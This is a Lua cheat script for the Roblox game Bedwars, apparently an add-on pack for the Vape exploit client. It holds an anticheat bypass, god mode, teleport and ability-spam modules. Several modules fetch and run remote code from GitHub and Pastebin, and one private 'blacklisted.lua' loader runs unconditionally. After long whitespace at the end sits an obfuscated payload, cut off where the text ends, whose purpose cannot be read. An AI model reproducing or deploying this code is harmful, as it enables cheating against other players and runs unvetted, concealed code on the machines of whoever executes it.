		local HeartBeatConnect2 = tick()
		local Value = HeartBeatConnect2 - (HeartBeatConnect2 - HeartBeatConnect <= 999 and 0 or 999)
		HeartBeatConnect = math.max(HeartBeatConnect,Value)
	end
	Disabler = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AnticheatBypassV2",
	    HoverText = "better AnticheatBypass reel",
        Function = function(callback)
            if callback then
				SendNotify = true
				NoDisable = true
				task.spawn(function()
					repeat
						task.wait()
						RenderSteppedConnection = game:GetService("RunService").RenderStepped:Connect(getRenderStepped)
						HeartbeatConnection = game:GetService("RunService").Heartbeat:Connect(getHeartBeat)
						local item = getItemNear("scythe")
						repeat task.wait() until item
						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then
							if DisablerMode.Value == "MoveDirection" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection
									})
								end
							elseif DisablerMode.Value == "LookVector" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
									})
								end
							end
							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
								bedwarsStore.scythe = tick() + 1
							end
						elseif item and lplr.Character.HandInvItem.Value ~= item.tool and bedwars.CombatController then
							if SendNotify then
								if DisablerNotify.Value == "Vape" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
								elseif DisablerNotify.Value == "Print" then
									print(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Warn" then
									warn(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Combined" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
									print(DisablerTable.Messages.Context3)
									warn(DisablerTable.Messages.Context3)
								end
								SendNotify = false
							end
							if DisablerMissing.Value == "Continue" then
								task.wait(DisablerTable.Values.Duration)
								SendNotify = true
								NoDisable = true
							elseif DisablerMissing.Value == "Disable" then
								NoDisable = false
							end
							if not NoDisable then
								Disabler.ToggleButton(false)
								return
							end
						elseif not item then
							if DisablerNotify.Value == "Vape" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
							elseif DisablerNotify.Value == "Print" then
								print(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Warn" then
								warn(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Combined" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
								print(DisablerTable.Messages.Context4)
								warn(DisablerTable.Messages.Context4)
							end
							Disabler.ToggleButton(false)
							return
						end
					until not Disabler.Enabled
				end)
			else
				HeartbeatConnection:Disconnect()
				RenderSteppedConnection:Disconnect()
            end
        end,
		ExtraText = function()
			return DisablerMode.Value
		end
    })
	DisablerMode = Disabler.CreateDropdown({
		Name = "Mode",
		List = {
			"MoveDirection",
			"LookVector"
		},
		HoverText = "Disabler Mode",
		Function = function() end,
	})
	DisablerMissing = Disabler.CreateDropdown({
		Name = "Missing Scythe",
		List = {
			"Continue",
			"Disable"
		},
		HoverText = "Actions that will occur when the Scythe is missing",
		Function = function() end,
	})
	DisablerNotify = Disabler.CreateDropdown({
		Name = "Notification",
		List = {
			"Vape",
			"Print",
			"Warn",
			"Combined"
		},
		HoverText = "Notification that will be displayed",
		Function = function() end,
	})
	DisablerDuration = Disabler.CreateSlider({
		Name = "Duration",
		Min = 1,
		Max = 10,
		HoverText = "Notification's Duration",
		Function = function() end,
		Default = 5
	})
	DisablerSpeedVal = Disabler.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 100,
		HoverText = "Direction Speed",
		Function = function() end,
		Default = 90
	})
	DisablerSpeed = Disabler.CreateToggle({
		Name = "Speed",
		Default = true,
		HoverText = "Adds speed to the direction",
		Function = function() end,
	})
	DisablerNotification = Disabler.CreateToggle({
		Name = "Notification",
		Default = true,
		HoverText = "Notifies you when certain actions happen",
		Function = function() end,
	})
end)

local Nebula = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
	["Name"] = "NebulaSky",
	["Function"] = function(callback)
		if callback then
			task.spawn(function() 

				local Vignette = true


				local Lighting = game:GetService("Lighting")
				local ColorCor = Instance.new("ColorCorrectionEffect")
				local SunRays = Instance.new("SunRaysEffect")
				local Sky = Instance.new("Sky")
				local Atm = Instance.new("Atmosphere")


				for i, v in pairs(Lighting:GetChildren()) do
					if v then
						v:Destroy()
					end
				end

				ColorCor.Parent = Lighting
				SunRays.Parent = Lighting
				Sky.Parent = Lighting
				Atm.Parent = Lighting

				if Vignette == true then
					local Gui = Instance.new("ScreenGui")
					Gui.Parent = StarterGui
					Gui.IgnoreGuiInset = true

					local ShadowFrame = Instance.new("ImageLabel")
					ShadowFrame.Parent = Gui
					ShadowFrame.AnchorPoint = Vector2.new(0,1,0)
					ShadowFrame.Position = UDim2.new(0,0,0,0)
					ShadowFrame.Size = UDim2.new(0,0,0,0)
					ShadowFrame.BackgroundTransparency = 1
					ShadowFrame.Image = ""
					ShadowFrame.ImageTransparency = 1
					ShadowFrame.ZIndex = 0
				end


				ColorCor.Brightness = 0.1
				ColorCor.Contrast = 0.5
				ColorCor.Saturation = -0.3
				ColorCor.TintColor = Color3.fromRGB(255, 235, 203)

				SunRays.Intensity = 0.075
				SunRays.Spread = 0.727

				Sky.SkyboxBk = "rbxassetid://13581437029"
				Sky.SkyboxDn = "rbxassetid://13581439832"
				Sky.SkyboxFt = "rbxassetid://13581447312"
				Sky.SkyboxLf = "rbxassetid://13581443463"
				Sky.SkyboxRt = "rbxassetid://13581452875"
				Sky.SkyboxUp = "rbxassetid://13581450222"
				Sky.SunAngularSize = 10

				Lighting.Ambient = Color3.fromRGB(2,2,2)
				Lighting.Brightness = 0.3
				Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
				Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
				Lighting.EnvironmentDiffuseScale = 0.2
				Lighting.EnvironmentSpecularScale = 0.2
				Lighting.GlobalShadows = true
				Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
				Lighting.ShadowSoftness = 0.2
				Lighting.ClockTime = 15
				Lighting.GeographicLatitude = 45
				Lighting.ExposureCompensation = 0.5

				Atm.Density = 0.364
				Atm.Offset = 0.556
				Atm.Color = Color3.fromRGB(179, 59, 249)
				Atm.Decay = Color3.fromRGB(155, 212, 255)
				Atm.Glare = 0.36
				Atm.Haze = 1.72	
                end)
			end
		end
    })

runFunction(function()
		local Reinject = {["Enabled"] = false}
		Reinject = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Reinject",
			["HoverText"] = "Reinjects Vape To Load Modules",
			   ["Function"] = function(Callback)
					Enabled = Callback
					if Enabled then
						Reinject["ToggleButton"](false)
						GuiLibrary["SelfDestruct"]()
						loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
	
	
					end
				end
		})
	end)

runFunction(function()
   Pink = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
	["Name"] = "PinkTheme",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				for i,v in pairs(lightingService:GetChildren()) do
					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
						v:Remove()
					end
				end
				local sky = Instance.new("Sky")
				sky.SkyboxBk = "rbxassetid://1546230803"
				sky.SkyboxDn = "rbxassetid://1546231143"
				sky.SkyboxFt = "rbxassetid://1546230803"
				sky.SkyboxLf = "rbxassetid://1546230803"
				sky.SkyboxRt = "rbxassetid://1546230803"
				sky.SkyboxUp = "rbxassetid://1546230451"
				sky.Parent = lightingService
				pcall(function() workspace.Clouds:Destroy() end)
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(255, 132, 178)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(0, 0, 0))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				local colorcorrection = Instance.new("ColorCorrectionEffect")
				colorcorrection.TintColor = Color3.fromRGB(255, 199, 220)
				colorcorrection.Brightness = 0.05
				colorcorrection.Parent = lightingService
				debug.setconstant(require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["hotbar-healthbar"]).HotbarHealthbar.render, 16, 16745650)
			end)
		end
	end
})
end)

runFunction(function()
        local FlyGui = {Enabled = false}
        FlyGui = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
            Name = "FlyLoader",
            HoverText = "Loads FlyGui credits to Red",
            Function = function(callback)
                if callback then
                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        loadstring(game:HttpGet(('https://pastebin.com/raw/h5QDPy6s'),true))()
						FlyGui.ToggleButton(false)
						warningNotification("APE", "Fly Gui Should Be Loaded Up", 5)
					else
                end
            end
		end
    })
end)

	runFunction(function()
		local InfiniteYield = {Enabled = false}
		InfiniteYield = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "InfiniteYield",
			Function = function(callback)
				if callback then
					task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
					InfiniteYield["ToggleButton"](false)
					warningNotification("APE", "Loaded Infinite Yield!", 5)
					end)
				end
			end,
			HoverText = "infinite yield lel"
		})
	end)

runFunction(function()
	local AnimationPlayer = {Enabled = false}
	local AnimationPlayerBox = {Value = "11335949902"}
	local AnimationPlayerSpeed = {Speed = 1}
	local playedanim
	AnimationPlayer = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "InvisibleExploit",
		HoverText = "put you underground",
		Function = function(callback)
			if callback then 
				if entityLibrary.isAlive then 
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
                        lplr.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
                        lplr.Character.HumanoidRootPart.Size = Vector3.new(2, 3, 1.1)
						
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(0 / 10)
						table.insert(AnimationPlayer.Connections, playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end))
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end
				table.insert(AnimationPlayer.Connections, lplr.CharacterAdded:Connect(function()
					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
					task.wait(0.5)
					if not AnimationPlayer.Enabled then return end
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(AnimationPlayerSpeed.Value / 10)
						playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end)
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end))
			else
				if playedanim then playedanim:Stop() playedanim = nil end
			end
		end
	})
end)

	runFunction(function()
		local HostPanelExploit = {Enabled = false}
		local oldhostattribute = nil
		HostPanelExploit = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "VisualHostPanel",
			HoverText = "only visual",
			Function = function(callback)
				task.spawn(function()
					if oldhostattribute == nil then 
						oldhostattribute = (lplr:GetAttribute("Cohost") or lplr:GetAttribute("Host")) and true or false
					end
					if not callback and bedwars.ClientStoreHandler:getState().Game.customMatch and oldhostattribute then 
						return
					end
					lplr:SetAttribute("Cohost", callback)
				end)
			end
		})
	end)

runFunction(function()
    local AutoSkywars = {Enabled = false}
    AutoSkywars = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AutoSkywars",
	HoverText = "tp you to middle sometimes works (only skywars)",
        Function = function(callback)
            if callback then
                task.spawn(function()
                    if bedwarsStore.queueType:find("skywars") then
                        if bedwarsStore.matchState ~= 0 then return end
                        repeat task.wait() until bedwarsStore.matchState ~= 0
                        if (not AutoSkywars.Enabled) then return end
                        task.wait(0.1)
                        local tween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {CFrame = workspace.SpectatorPlatform.floor.CFrame - Vector3.new(0,1.5,5)})
                        tween:Play()
                        tween.Completed:Wait()
                        task.wait(0.5)
                        workspace.SpectatorPlatform.floor.CanCollide = false
                    end
                end)
            end
        end
    })
end)

function IsAlive(plr)
    plr = plr or lplr
    if not plr.Character then return false end
    if not plr.Character:FindFirstChild("Head") then return false end
    if not plr.Character:FindFirstChild("Humanoid") then return false end
    if plr.Character:FindFirstChild("Humanoid").Health < 0.11 then return false end
    return true
end

runFunction(function()
    local GodMode = {Enabled = false}
    GodMode = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "PartialGodMode",
        Function = function(callback)
            if callback then
				spawn(function()
					while task.wait() do
						if (not GodMode.Enabled) then return end
						if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) then
							for i, v in pairs(game:GetService("Players"):GetChildren()) do
								if v.Team ~= lplr.Team and IsAlive(v) and IsAlive(lplr) then
									if v and v ~= lplr then
										local TargetDistance = lplr:DistanceFromCharacter(v.Character:FindFirstChild("HumanoidRootPart").CFrame.p)
										if TargetDistance < 25 then
											if not lplr.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity") then
												repeat task.wait() until bedwarsStore.matchState ~= 0
												if not (v.Character.HumanoidRootPart.Velocity.Y < -10*5) then
													lplr.Character.Archivable = true
			
													local Clone = lplr.Character:Clone()
													Clone.Parent = workspace
													Clone.Head:ClearAllChildren()
													gameCamera.CameraSubject = Clone:FindFirstChild("Humanoid")
				
													for i,v in pairs(Clone:GetChildren()) do
														if string.lower(v.ClassName):find("part") and v.Name ~= "HumanoidRootPart" then
															v.Transparency = 1
														end
														if v:IsA("Accessory") then
															v:FindFirstChild("Handle").Transparency = 1
														end
													end
				
													lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0,100000,0)
				
													game:GetService("RunService").RenderStepped:Connect(function()
														if Clone ~= nil and Clone:FindFirstChild("HumanoidRootPart") then
															Clone.HumanoidRootPart.Position = Vector3.new(lplr.Character.HumanoidRootPart.Position.X, Clone.HumanoidRootPart.Position.Y, lplr.Character.HumanoidRootPart.Position.Z)
														end
													end)
				
													task.wait(0.3)
													lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X, -1, lplr.Character.HumanoidRootPart.Velocity.Z)
													lplr.Character.HumanoidRootPart.CFrame = Clone.HumanoidRootPart.CFrame
													gameCamera.CameraSubject = lplr.Character:FindFirstChild("Humanoid")
													Clone:Destroy()
													task.wait(0.15)
												end
											end
										end
									end
								end
							end
						end
					end
				end)
			end
        end
    })
end)

	runFunction(function()
		local AutoEmber = {Enabled = false}
		AutoEmber = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "4BigGuysExploit",
			HoverText = "Automatically uses the ember ability.",
			Function = function(callback)
				if callback then 
					task.spawn(function()
						repeat 
							local saber = getItem("infernal_saber")
							if killauraNearPlayer and saber then 
								bedwars.ClientHandler:Get("HellBladeRelease"):SendToServer({chargeTime = 0.5, player = lplr, weapon = saber.tool})
							end
							task.wait()
						until not AutoEmber.Enabled
					end)
				end
			end
		})
	end)
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/blacklisted.lua"))()

warningNotification("APE", "Loaded Succesfully By RayHafz!", 5)
																																																																						
do local a=[[77fuscator 0.5.0 - discord.gg/CEHsVcBcuf]];return(function(b,c,d,e,f,f,g,h,i,j,k,l,l,m,n,o,p,q,r,s,t,u,u,v,w,w,x,y,y,z,z,z,ba,ba,bb,bb,bb,bc)local bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cp,cq,cr=0 while true do if bd<=17 then if bd<=8 then if bd<=3 then if bd<=1 then if 1>bd then be,bf,bg,bh,bi,bj,bk=string.sub,table.concat,string.char,tonumber,next,(table.create or function(cs,ct)local cu={};for cv=1,cs do cu[cv]=ct;end;return cu;end)or tostring else bl=1 end else if 2==bd then bm=function(bi)local bk,cs,ct,cu,cv,cw,cx,cy=0 while true do if bk<=5 then if bk<=2 then if bk<=0 then cs,ct=g,g else if bk<2 then cu=bj(#bi)else cv=256 end end else if bk<=3 then cw=bj(cv)else if bk<5 then for bj=0,cv-1 do cw[bj]=bg(bj)end else cx=1 end end end else if bk<=8 then if bk<=6 then cy=function()local bj,cz,da=0 while true do if bj<=2 then if bj<=0 then cz=bh(be(bi,cx,cx),36)else if 1<bj then da=bh(be(bi,cx,cx+cz-1),36)else cx=cx+1 end end else if bj<=3 then cx=cx+cz else if 4==bj then return da else break end end end bj=bj+1 end end else if 7<bk then cu[1]=cs else cs=bg(cy())end end else if bk<=9 then while cx<#bi and#a==d do local a=cy()if cw[a]then ct=cw[a]else ct=cs..be(cs,1,1)end cw[cv]=(cs..be(ct,1,1))cu[#cu+1],cs,cv=ct,ct,(cv+1)end else if bk~=11 then return bf(cu)else break end end end end bk=bk+1 end end else bn=bm(b)end end else if bd<=5 then if 5~=bd then bo={}else c={u,m,q,x,s,i,w,k,l,j,y,o,nil,nil};end else if bd<=6 then bp=v else if bd<8 then bq=bp(bo)else br,bs=1,(-308+(function()local a,b,c,d=0 while true do if a<=1 then if 1~=a then b,c=0,1 else d=(function(q,s)local v=0 while true do if v<1 then s(q(s and s,(q and q)),s(q,s))else break end v=v+1 end end)(function(q,s)local v=0 while true do if v<=2 then if v<=0 then if(b>337)then return s end else if v~=2 then b=b+1 else c=((c-402)%1328)end end else if v<=3 then if((c%400))>200 then return q(q(q,(s and s)),s(s,s))else return q end else if v<5 then return s else break end end end v=v+1 end end,function(q,s)local v=0 while true do if v<=2 then if v<=0 then if b>213 then return s end else if 1<v then c=((c-232)%34799)else b=(b+1)end end else if v<=3 then if(c%328)>=164 then c=(((c*872))%49852)return q(q(s,s),q((s and s),q))else return q end else if v~=5 then return q else break end end end v=v+1 end end)end else if a==2 then return c;else break end end a=a+1 end end)())end end end end else if bd<=12 then if bd<=10 then if bd>9 then bu=function(a,b)local c,d=0 while true do if c<=1 then if c<1 then d=0 else for q=0,31 do local s=(a%2)local v=(b%2)if not(s~=0)then if v==1 then b=b-1 d=d+2^q end else a=(a-1)if v==0 then d=(d+(2^q))else b=(b-1)end end b=b/2 a=a/2 end end else if 2==c then return d else break end end c=c+1 end end else bt={}end else if bd~=12 then bv=function(a,b)local c=0 while true do if 0==c then return((a*2^b));else break end c=c+1 end end else bw=function()local a,b,c=0 while true do if a<=1 then if 1>a then b,c=h(bn,br,(br+2))else b,c=bu(b,bs),bu(c,bs);end else if a<=2 then br=(br+2);else if 3==a then return(bv(c,8))+b;else break end end end a=a+1 end end end end else if bd<=14 then if bd==13 then do for a,b in o,l(bl)do bt[a]=b;end;end;else bx=bt end else if bd<=15 then by=function(a,b)local c=0 while true do if c<1 then return p((a/2^b));else break end c=c+1 end end else if 17~=bd then bz=(2^32-1)else ca=function(a,b)local c=0 while true do if 1>c then return(((a+b)-bu(a,b))/2)else break end c=c+1 end end end end end end end else if bd<=26 then if bd<=21 then if bd<=19 then if 18==bd then cb=bw()else cc=function(a,b)local c=0 while true do if c<1 then return bz-ca(bz-a,bz-b)else break end c=c+1 end end end else if 21~=bd then cd=function(a,b,c)local d=0 while true do if d==0 then if c then local c=((a/2^(b-1))%2^((c-1)-(b-1)+1))return c-(c%1)else local b=(2^(b-1))return((a%(b+b)>=b)and 1 or 0)end else break end d=d+1 end end else ce=bw()end end else if bd<=23 then if 22<bd then cg=function()local a,b=0 while true do if a<=1 then if 0<a then br=br+1;else b=bu(h(bn,br,br),cb)end else if a~=3 then return b;else break end end a=a+1 end end else cf=function()local a,b,c,d,p=0 while true do if a<=1 then if a~=1 then b,c,d,p=h(bn,br,(br+3))else b,c,d,p=bu(b,cb),bu(c,cb),bu(d,cb),bu(p,cb);end else if a<=2 then br=(br+4);else if 3<a then break else return((bv(p,24)+bv(d,16)+bv(c,8)))+b;end end end a=a+1 end end end else if bd<=24 then ch,ci,cj=nil else if bd<26 then ch=(-14488+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a>0 then c=48533 else b=526 end else if a<=2 then d=3 else if a~=4 then p=270 else q=540 end end end else if a<=7 then if a<=5 then s=12318 else if 7>a then v=385 else w=137 end end else if a<=8 then x=35083 else if a==9 then y=254 else be=340 end end end end else if a<=15 then if a<=12 then if 11<a then bg=170 else bf=2 end else if a<=13 then bh=19255 else if 15~=a then bi=1 else bj=423 end end end else if a<=18 then if a<=16 then bk=240 else if a==17 then bs=0 else bw,by=bs,bi end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if 1~=ce then cc(ca(ca,ca)and ca(ca,ca),cc(cc,(ca and ca))and cc(ca,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bk then local bk=bs while true do bk=(bk+bi)if not(bk~=bi)then return cc else break end end end else if 2>ce then bw=(bw+bi)else by=((by-bj)%bh)end end else if ce<=3 then if((by%be)<bg)then local be=bs while true do be=(be+bi)if((be>bf)or be==bf)then if(be<d)then return cc(ca(ca,(ca and cc)),cc(ca,ca))else break end else by=(by+y)%x end end else local x=bs while true do x=(x+bi)if(x<bf)then return cc else break end end end else if ce<5 then return ca else break end end end ce=ce+1 end end,function(x,y)local be=0 while true do if be<=2 then if be<=0 then if(bw>w)then local w=bs while true do w=w+bi if not(w~=bf)then break else return x end end end else if 2~=be then bw=bw+bi else by=((by*v)%s)end end else if be<=3 then if((by%q)>p)then local p=bs while true do p=(p+bi)if(p==bi or p<bi)then by=(by*b)%c else if not(not(p==d))then break else return x(y(x,y),x(y,x))end end end else local b=bs while true do b=b+bi if(b<bf)then return x else break end end end else if be~=5 then return y else break end end end be=be+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)());else ci=((-25303+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca=0 while true do if a<=0 then b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca=0 else if a==1 then while true do if(b<=10)then if(b<4 or b==4)then if b<=1 then if not(b==1)then c=40425 else d=236 end else if(b<2 or b==2)then p=960 else if(4>b)then q=1920 else s=33223 end end end else if(b==7 or b<7)then if(b<5 or b==5)then v=2 else if(7~=b)then w=894 else x=201 end end else if(b<8 or b==8)then y=3 else if not(b==10)then be=1330 else bf=5906 end end end end else if(b<=15)then if b<=12 then if 11<b then bh=665 else bg=617 end else if(b<=13)then bi=211 else if(b==14)then bj=33389 else bk=787 end end end else if(b<18 or b==18)then if(b==16 or b<16)then bs=1 else if(18>b)then bw=0 else by,bz=bw,bs end end else if(b<19 or b==19)then ca=(function(cc,ce)local cs,ct=0 while true do if cs<=0 then ct=0 else if cs>1 then break else while true do if ct==0 then ce(ce(cc,cc),cc(ce,ce))else break end ct=(ct+1)end end end cs=cs+1 end end)(function(cc,ce)local cs,ct=0 while true do if cs<=0 then ct=0 else if 2~=cs then while true do if(ct<=2)then if ct<=0 then if by>bi then local bi=bw while true do bi=bi+bs if not((bi~=bs))then return ce else break end end end else if not(1~=ct)then by=(by+bs)else bz=(((bz-bk)%bj))end end else if(ct<3 or ct==3)then if(((bz%be))<bh)then local be=bw while true do be=((be+bs))if(be==bs or(be<bs))then bz=(bz*bg)%bf else if not(not(be==y))then break else return ce(ce(ce,ce),((cc(ce,ce)and ce(cc,ce))))end end end else local be=bw while true do be=((be+bs))if not(be~=v)then break else return ce end end end else if ct<5 then return ce else break end end end ct=(ct+1)end else break end end cs=cs+1 end end,function(be,bf)local bg,bh=0 while true do if bg<=0 then bh=0 else if bg==1 then while true do if(bh==2 or bh<2)then if(bh<=0)then if(by>x)then local x=bw while true do x=((x+bs))if not(not(not(x~=v)))then break else return bf end end end else if bh==1 then by=((by+bs))else bz=(((bz+w)%s))end end else if(bh==3 or bh<3)then if(((bz%q))>p)then local p=bw while true do p=(p+bs)if(p<bs or p==bs)then bz=(((bz*d))%c)else if not(not(not(p~=y)))then break else return bf(be(be,(bf and be)),bf(bf,be))end end end else local c=bw while true do c=(c+bs)if(c>bs)then break else return be end end end else if(5~=bh)then return be else break end end end bh=(bh+1)end else break end end bg=bg+1 end end)else if not(20~=b)then return bz;else break end end end end end b=b+1 end else break end end a=a+1 end end)()));end end end end else if bd<=31 then if bd<=28 then if 28~=bd then cj=(-1671+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca,cc,ce,cs,ct,cu,cv,cw,cx,cy,cz=0 while true do if a<=15 then if a<=7 then if a<=3 then if a<=1 then if a==0 then b=409 else c=818 end else if 2==a then d=28939 else p=222 end end else if a<=5 then if 4<a then s=38485 else q=389 end else if a>6 then w=583 else v=1166 end end end else if a<=11 then if a<=9 then if 8<a then y=425 else x=9454 end else if 10<a then bf=442 else be=4509 end end else if a<=13 then if a>12 then bh=3 else bg=292 end else if 14<a then bj=848 else bi=1696 end end end end else if a<=23 then if a<=19 then if a<=17 then if a<17 then bk=579 else bs=10108 end else if 19~=a then bw=252 else by=908 end end else if a<=21 then if a<21 then bz=5205 else ca=470 end else if 22<a then ce=1816 else cc=746 end end end else if a<=27 then if a<=25 then if 24==a then cs=18568 else ct=2 end else if 27>a then cu=1 else cv=421 end end else if a<=29 then if a>28 then cx,cy=cw,cu else cw=0 end else if a<=30 then cz=(function(da,db,dc,dd)local de=0 while true do if 0==de then da(db(dd,dd,dc,dd),dc(db,da,db,dd),dc(dc,db,dc,dc),dd(db and da,dd,dc,dc))else break end de=de+1 end end)(function(da,db,dc,dd)local de=0 while true do if de<=2 then if de<=0 then if((cx>cv))then local cv=cw while true do cv=(cv+cu)if((cv<ct))then return db else break end end end else if de<2 then cx=(cx+cu)else cy=(((cy+cc))%cs)end end else if de<=3 then if(not((cy%ce)~=by)or(cy%ce)>by)then local by=cw while true do by=(by+cu)if(by==cu or by<cu)then cy=(((cy-ca))%bz)else if not(by~=ct)then return db(da(dc,da,da,(db and dc)),dc(db,db,da,(dc and dd)),dc(da,dd,da,dc),(da(dc,((dd and db)),db and dc,da)and da(((dc and dd)),(dc and da),dd,dc)))else break end end end else local by=cw while true do by=(by+cu)if not(by~=ct)then break else return da 